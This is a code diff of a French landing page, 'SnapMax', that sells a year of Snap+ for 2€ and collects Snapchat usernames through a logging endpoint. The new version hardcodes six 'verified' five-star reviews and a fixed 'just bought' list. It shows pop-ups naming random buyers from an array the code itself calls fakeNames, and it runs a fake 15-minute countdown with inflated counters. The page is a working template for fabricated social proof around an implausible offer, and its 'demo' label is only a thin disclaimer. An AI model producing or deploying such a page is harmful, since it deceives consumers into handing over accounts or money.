@@ -2,156 +2,206 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>SnapLeak — 1 an de Snap+</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SnapMax — Récupère 1 an de Snap+</title>
   <link rel="icon" type="image/png" href="/logo.png?v=2" />
   <style>
     :root{
       --bg:#0b0b10;--panel:#0f1018;--panel2:#0d0e15;--line:#24283a;--text:#f7f7fb;--muted:#a3a3b2;
-      --grad1:#ffd36e;--grad2:#ff79d1;--cta:#5dd39e;--cta2:#48a6ff;--danger:#ff6b6b;--radius:18px;
+      --grad1:#ffd36e;--grad2:#ff79d1;--ok:#23c77d;--chip:#1a442b;--radius:18px;
     }
     *{box-sizing:border-box}
     html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.55 system-ui,-apple-system,Segoe UI,Roboto,Inter}
-    a{color:var(--cta2);text-decoration:none}
-    .wrap{max-width:1100px;margin:auto;padding:18px}
+    a{color:#7ecbff;text-decoration:none}
+    .wrap{max-width:1100px;margin:auto;padding:20px}
     .header{position:sticky;top:0;z-index:40;background:linear-gradient(180deg,#0b0b10ee,#0b0b1000);backdrop-filter:saturate(120%) blur(6px);border-bottom:1px solid #171a28}
     .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
-    .brand{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.2px}
-    .brand span{font-size:20px;background:linear-gradient(90deg,var(--grad1),var(--grad2));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .brand{display:flex;align-items:center;gap:10px}
+    .brand span{font-weight:900;letter-spacing:.2px;background:linear-gradient(90deg,var(--grad1),var(--grad2));-webkit-background-clip:text;background-clip:text;color:transparent}
     .btn{display:inline-flex;align-items:center;gap:8px;border:1px solid #ffffff22;background:#ffffff10;color:#fff;padding:10px 14px;border-radius:12px;cursor:pointer}
     .btn:hover{background:#ffffff18}
-    .hero{margin-top:18px;border:1px solid var(--line);background:
-      radial-gradient(1200px 600px at 10% -20%, #ffae6a12, transparent 60%),
-      radial-gradient(1200px 600px at 90% -30%, #c06bff12, transparent 60%),
-      var(--panel); border-radius:var(--radius); padding:26px}
-    h1{margin:0 0 8px;font-size:34px}
+    .hero{margin-top:18px}
+    h1{margin:10px 0 6px;font-size:44px;line-height:1.15}
     .muted{color:var(--muted)}
-    .grid{display:grid;grid-template-columns:1.2fr .8fr;gap:16px}
-    @media(max-width:960px){.grid{grid-template-columns:1fr}}
+    .kpi-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:18px 0}
+    @media(max-width:980px){.kpi-grid{grid-template-columns:1fr 1fr}}
+    .kpi{border:1px solid var(--line);background:var(--panel2);border-radius:16px;padding:18px;text-align:center}
+    .kpi .big{font-size:26px;font-weight:900}
+    .kpi .sub{font-size:12px;color:var(--muted);margin-top:6px}
+
     .card{border:1px solid var(--line);background:var(--panel2);border-radius:var(--radius);padding:16px}
+    .buy-list{margin-top:8px;border:1px solid var(--line);background:#0f1119;border-radius:14px;overflow:hidden}
+    .buy-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border-top:1px solid #1b1e2a}
+    .buy-row:first-child{border-top:0}
+    .badge-dot{width:26px;height:26px;border-radius:50%;background:#f2a3a3;color:#000;display:flex;align-items:center;justify-content:center;font-weight:800}
+    .bname{font-weight:700}
+    .btime{font-size:12px;color:var(--muted)}
+    .chip{margin-left:auto;font-size:12px;border:1px solid #214d33;background:#163223;color:#b3ffd6;border-radius:999px;padding:6px 10px}
+
+    .features{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:16px}
+    @media(max-width:980px){.features{grid-template-columns:1fr}}
+    .feature{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}
+
+    .reviews{margin-top:18px}
+    .reviews-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+    @media(max-width:980px){.reviews-grid{grid-template-columns:1fr}}
+    .rev{border:1px solid var(--line);background:#0f1119;border-radius:14px;padding:16px}
+    .avatar{width:26px;height:26px;border-radius:50%;background:#222;color:#bbb;display:flex;align-items:center;justify-content:center;font-weight:800;margin-right:8px}
+    .rev-row{display:flex;align-items:center;margin-bottom:10px}
+    .stars{color:#ffcc66;margin-left:34px}
+
+    .offer{margin-top:18px;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:16px}
+    .count{font-size:32px;font-weight:900;letter-spacing:1px}
     .input{width:100%;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0c0d14;color:#fff}
-    .cta{background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:12px 14px;border-radius:14px;font-weight:800;cursor:pointer}
-    .cta:hover{filter:brightness(1.05)}
-    .stack{display:grid;gap:10px}
-    .price{display:flex;align-items:flex-end;gap:10px}
-    .price .big{font-size:46px;font-weight:900}
-    .badge{font-size:12px;border:1px solid #ffffff1e;background:#ffffff12;padding:6px 8px;border-radius:999px}
-    .kpis{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:12px}
-    .kpi{border:1px solid var(--line);background:#0f1119;border-radius:12px;padding:10px;text-align:center}
-    .list{display:grid;gap:10px}
-    .item{border:1px solid var(--line);background:#0f1119;border-radius:12px;padding:12px}
-    .meta{font-size:12px;color:var(--muted);display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
-    .user{font-weight:700;color:#fff}
-    /* Toasts / notifs */
+    .cta{margin-top:12px;background:linear-gradient(90deg,var(--grad1),var(--grad2));color:#212127;border:0;padding:14px;border-radius:14px;font-weight:900;cursor:pointer;width:100%}
+    .footnote{color:var(--muted);font-size:12px;margin-top:10px}
+
+    /* Toasts */
     .toasts{position:fixed;right:16px;bottom:16px;display:grid;gap:8px;width:min(320px,90vw);z-index:50}
     .toast{display:flex;gap:10px;align-items:center;background:#0f1712;border:1px solid #2a3b30;color:#d9ffe7;padding:10px 12px;border-radius:12px;box-shadow:0 8px 30px #0006;opacity:0;transform:translateY(10px);transition:.3s}
     .toast.show{opacity:1;transform:translateY(0)}
-    .ok{width:18px;height:18px;border-radius:50%;background:#23c77d;flex:0 0 18px}
+    .ok{width:18px;height:18px;border-radius:50%;background:var(--ok);flex:0 0 18px}
   </style>
 </head>
 <body>
-  <!-- Header (ancien style) -->
+  <!-- Header -->
   <div class="header">
     <div class="wrap row">
       <div class="brand">
         <img src="/logo.png" alt="Logo" style="height:28px;width:auto;border-radius:8px;display:block;">
-        <span>SnapLeak</span>
+        <span>SnapMax</span>
       </div>
-      <div class="row" style="gap:8px">
-        <a class="btn" href="#messages">Messages</a>
-        <a class="btn" href="#acheter">Obtenir Snap+ →</a>
-      </div>
+      <a class="btn" href="#acheter">Obtenir Snap+ →</a>
     </div>
   </div>
 
   <main class="wrap">
-    <!-- HERO + Pricing 2€ -->
+    <!-- HERO -->
     <section class="hero">
-      <h1>1 an de Snap+ — Accès immédiat</h1>
-      <p class="muted">Design “ancien” conservé, fonctionnalités ajoutées (messages + notifs). Démo.</p>
+      <h1>Récupère 1 an de Snap+</h1>
+      <p class="muted">Design original, offre 2€, et preuves sociales dynamiques.</p>
 
-      <div class="grid">
-        <!-- Colonne gauche : formulaire -->
-        <div class="card">
-          <div class="stack">
-            <div class="badge">Étape 1 — Infos</div>
-            <input id="snuser" class="input" placeholder="Pseudo Snapchat (ex: enzo_lol)">
-            <input id="email" class="input" placeholder="Email (optionnel)">
-          </div>
+      <!-- KPIs -->
+      <div class="kpi-grid">
+        <div class="kpi"><div class="big">2€</div><div class="sub">Offre limitée</div></div>
+        <div class="kpi"><div class="big">+ 3 129</div><div class="sub">Récupérations</div></div>
+        <div class="kpi"><div class="big">~2 min</div><div class="sub">Délai moyen</div></div>
+        <div class="kpi"><div class="big">4.8/5</div><div class="sub">Satisfaction</div></div>
+      </div>
 
-          <div class="stack" style="margin-top:12px">
-            <div class="badge">Étape 2 — Message (facultatif)</div>
-            <textarea id="message" class="input" rows="3" placeholder="Écris ici (max 300 caractères)"></textarea>
-            <div class="row" style="justify-content:flex-end;gap:10px">
-              <button id="sendMessage" class="btn">Envoyer un message</button>
-              <a id="acheter" class="cta">Continuer →</a>
-            </div>
-            <p class="muted" style="font-size:12px;margin:6px 0 0">
-              En envoyant, tu acceptes que ce message soit affiché publiquement (page “Messages reçus”).
-            </p>
+      <!-- TICKER “Ils viennent d’acheter” -->
+      <div class="card">
+        <div class="row" style="justify-content:space-between">
+          <div class="row" style="gap:10px;align-items:center">
+            <div style="font-weight:800">Ils viennent d’acheter</div>
+            <div class="muted" style="font-size:12px">Preuves sociales en temps réel</div>
           </div>
-
-          <div class="kpis">
-            <div class="kpi"><div class="badge">Sécurisé</div><div class="muted">Paiement via prestataire tiers</div></div>
-            <div class="kpi"><div class="badge">Rapide</div><div class="muted">Activation immédiate</div></div>
-            <div class="kpi"><div class="badge">Support</div><div class="muted">7j/7</div></div>
-          </div>
+          <div class="chip">+ 3 129</div>
         </div>
 
-        <!-- Colonne droite : carte tarif -->
-        <div class="card">
-          <div class="badge">Offre</div>
-          <div class="price" style="margin:10px 0 6px">
-            <div class="big">2€</div><div class="muted">/ 1 an</div>
-          </div>
-          <ul class="muted" style="margin:0 0 12px 18px">
-            <li>Snap+ complet</li>
-            <li>Sans engagement</li>
-            <li>Dispo immédiate</li>
-          </ul>
-          <a class="cta" href="#acheter">Obtenir Snap+ →</a>
+        <div class="buy-list" id="buy-list">
+          <!-- lignes ajoutées en JS -->
+        </div>
+      </div>
 
-          <div class="card" style="margin-top:12px">
-            <div class="row" style="justify-content:space-between;align-items:center;margin-bottom:6px">
-              <div class="badge">Aperçu — derniers messages</div>
-              <a class="btn" href="/messages.html" id="messages">Page complète</a>
-            </div>
-            <div id="preview" class="list"><div class="muted">Chargement…</div></div>
+      <!-- Features -->
+      <div class="features">
+        <div class="feature"><h3 style="margin:0 0 8px">Activation rapide</h3><p class="muted">Accès en quelques minutes après confirmation.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Priorité premium</h3><p class="muted">Traitement prioritaire sur certaines fonctionnalités.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Sans engagement</h3><p class="muted">Tu arrêtes quand tu veux, en 2 clics.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Support réactif</h3><p class="muted">Nos réponses rapides aux questions essentielles.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Prix unique</h3><p class="muted">2€ au lieu de 47,99€ — offre limitée.</p></div>
+        <div class="feature"><h3 style="margin:0 0 8px">Sécurisé</h3><p class="muted">Données traitées selon les bonnes pratiques.</p></div>
+      </div>
+
+      <!-- Avis -->
+      <div class="reviews">
+        <div class="row" style="justify-content:space-between;align-items:center">
+          <div class="row" style="gap:10px;align-items:center">
+            <img src="/logo.png" alt="" style="width:18px;height:18px;border-radius:4px;opacity:.9">
+            <strong>Avis vérifiés</strong>
+          </div>
+          <div class="chip" style="background:#14231a;border-color:#224a31;color:#b9ffd9">4.8/5</div>
+        </div>
+
+        <div class="reviews-grid" style="margin-top:10px">
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">M</div><div><strong>Mélanie P.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">J’ai reçu mon accès en 2 minutes, nickel 👌</p>
+          </div>
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">A</div><div><strong>Adam L.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">Simple et rapide. Rien à dire.</p>
+          </div>
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">I</div><div><strong>Inès R.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">J’étais sceptique… mais ça marche. Merci.</p>
+          </div>
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">L</div><div><strong>Lucas D.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">Support réactif, au top.</p>
+          </div>
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">N</div><div><strong>Nora Z.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">Bonne affaire pour 2€.</p>
+          </div>
+          <div class="rev">
+            <div class="rev-row"><div class="avatar">Y</div><div><strong>Yanis G.</strong></div></div>
+            <div class="stars">★★★★★</div>
+            <p class="muted">Clairement le meilleur plan.</p>
           </div>
         </div>
       </div>
-    </section>
 
-    <!-- Bande “preuves sociales” (ancien esprit) -->
-    <section class="grid" style="margin-top:16px">
-      <div class="card">
-        <h3 style="margin:0 0 8px">Interface familière</h3>
-        <p class="muted">On garde le look & feel que tu avais au début, avec une touche plus soignée.</p>
-      </div>
-      <div class="card">
-        <h3 style="margin:0 0 8px">100% concentré sur 2€</h3>
-        <p class="muted">Un seul tarif clair pour simplifier la décision.</p>
+      <!-- Offre + Compteur + Form -->
+      <div class="offer" id="acheter">
+        <div class="row" style="gap:10px;align-items:center;margin-bottom:10px">
+          <div style="display:flex;align-items:center;gap:8px"><span style="color:#ffae6a">⚡</span><strong>OFFRE LIMITÉE — PLUS QUE</strong></div>
+        </div>
+        <div class="count" id="count">00:15:00</div>
+        <div style="height:1px;background:#1a1d2a;margin:12px 0"></div>
+        <div class="row" style="gap:10px;align-items:center;margin:6px 0 10px">
+          <div class="kpi" style="flex:0 0 auto;padding:8px 12px"><div class="big" style="font-size:20px">2€</div></div>
+          <div class="muted">au lieu de 47,99€ pour 1 an complet</div>
+        </div>
+        <input id="snuser" class="input" placeholder="Nom d’utilisateur Snapchat (ex: enzo_lol)">
+        <button id="cta" class="cta">Obtenir Snap+ maintenant 🔒</button>
+        <p class="footnote">Démo non affiliée à Snap Inc. — Utilise seulement des visuels dont tu détiens les droits. <a href="/messages.html" class="muted">Voir messages</a></p>
       </div>
     </section>
-
-    <p class="muted" style="margin:24px 0 60px;font-size:12px">
-      Démo pédagogique — non affiliée à Snap Inc.
-    </p>
   </main>
 
-  <!-- Toasts (notifs bas droite) -->
+  <!-- Toasts -->
   <div class="toasts" id="toasts"></div>
 
   <script>
-    // --- Endpoints relatifs (parfaits pour Vercel) ---
+    // --- Endpoints relatifs (Vercel) ---
     const LOG_API = "/api/log";
-    const MSG_API = "/api/messages";
+    const MSG_API = "/api/messages"; // utilisé si tu ajoutes un aperçu ailleurs
 
-    // util
-    const $ = (sel) => document.querySelector(sel);
+    // Utils
+    const $ = (s)=>document.querySelector(s);
     const esc=(s='')=>s.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-    const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
+    const sleep=(ms)=>new Promise(r=>setTimeout(r,ms));
 
+    // Compte à rebours 15 min
+    (function countdown(dur=15*60){
+      let s=dur;
+      const el=$("#count");
+      function tick(){
+        const m=Math.floor(s/60), ss=String(s%60).padStart(2,"0");
+        el.textContent=`${String(Math.floor(m/60)).padStart(2,"0")}:${String(m%60).padStart(2,"0")}:${ss}`;
+        if(s>0){ s--; setTimeout(tick,1000); }
+      }
+      tick();
+    })();
+
+    // Logs
     async function sendLog(evt){
       const r = await fetch(LOG_API,{
         method:"POST",
@@ -163,58 +213,45 @@
       return j;
     }
 
-    // --- Click “Continuer” (checkout_start) ---
-    $("#acheter").addEventListener("click", async (e)=>{
-      e.preventDefault();
+    // CTA
+    $("#cta").addEventListener("click", async ()=>{
       const u = ($("#snuser")?.value||"").trim();
-      const em = ($("#email")?.value||"").trim();
       if(!u){ alert("Entre ton pseudo Snapchat 🙂"); return; }
       try{
-        await sendLog({ event_type:"checkout_start", user_name:u, email:em });
-        showToast(`@${u} a commencé l'achat`);
-      }catch{ alert("Échec de l’envoi. Réessaie."); }
-    });
-
-    // --- Envoi d’un message public ---
-    $("#sendMessage").addEventListener("click", async ()=>{
-      const u = ($("#snuser")?.value||"").trim() || "anonyme";
-      const m = ($("#message")?.value||"").trim();
-      if(!m) return alert("Écris un message 🙂");
-      if(m.length>300) return alert("300 caractères max.");
-      try{
-        await sendLog({ event_type:"message_sent", user_name:u, payload:{ message:m }});
-        $("#message").value="";
-        showToast(`Message de @${u} envoyé ✅`);
-        loadPreview();
-      }catch{ alert("Échec de l’envoi. Réessaie."); }
-    });
-
-    // --- Aperçu des derniers messages (panel de droite) ---
-    async function loadPreview(){
-      const box=$("#preview");
-      try{
-        const r = await fetch(MSG_API+"?limit=6");
-        const data = await r.json();
-        if(!data.ok) throw new Error(data.error||"Erreur API");
-        if(!data.items.length){ box.innerHTML = '<div class="muted">Aucun message pour le moment.</div>'; return;}
-        box.innerHTML = data.items.map(it=>`
-          <div class="item">
-            <div class="meta">
-              <span class="user">@${esc(it.user||"anonyme")}</span>
-              <span>•</span>
-              <span>${new Date(it.at).toLocaleString()}</span>
-            </div>
-            <div>${esc(it.message||"")}</div>
-          </div>
-        `).join("");
+        await sendLog({ event_type:"checkout_start", user_name:u });
+        showToast(`@${u} vient de lancer l'achat`);
       }catch(e){
-        box.innerHTML = '<div class="muted">Impossible de charger les messages.</div>';
+        alert("Échec de l’envoi. Réessaie.");
         console.warn(e);
       }
-    }
-    loadPreview();
+    });
 
-    // --- Notifs “achats récents” en bas à droite ---
+    // Liste “Ils viennent d’acheter”
+    const starters = [
+      {name:"maria_e", ago:"il y a 8m"},
+      {name:"emma-k", ago:"il y a 10m"},
+      {name:"kylianx", ago:"il y a 12m"},
+      {name:"enzo_lol", ago:"il y a 10s"},
+    ];
+    const buyList = $("#buy-list");
+    function row(name,ago){
+      const initial = esc(name[0]||"?").toUpperCase();
+      return `
+        <div class="buy-row">
+          <div class="badge-dot">${initial}</div>
+          <div>
+            <div class="bname">${esc(name)}</div>
+            <div class="btime">${esc(ago)}</div>
+          </div>
+          <div class="chip">✓ Snap+</div>
+        </div>`;
+    }
+    function renderList(){
+      buyList.innerHTML = starters.map(x=>row(x.name,x.ago)).join("");
+    }
+    renderList();
+
+    // Toasts bas droite (achats aléatoires)
     const fakeNames = ["enzo_lol","mila_snap","axel.93","nora_dev","yanisx","lea__","momo.z","clara_t","imad75","sarah_2"];
     const toasts = $("#toasts");
     function showToast(text){
@@ -225,14 +262,13 @@
       requestAnimationFrame(()=>el.classList.add("show"));
       setTimeout(()=>{el.classList.remove("show"); setTimeout(()=>el.remove(),300);}, 4000);
     }
-    async function loopToasts(){
+    (async function loopToasts(){
       while(true){
         await sleep(6000 + Math.random()*6000);
         const name = fakeNames[Math.floor(Math.random()*fakeNames.length)];
         showToast(`@${name} vient d'acheter 1 an Snap+`);
       }
-    }
-    loopToasts();
+    })();
   </script>
 </body>
 </html>
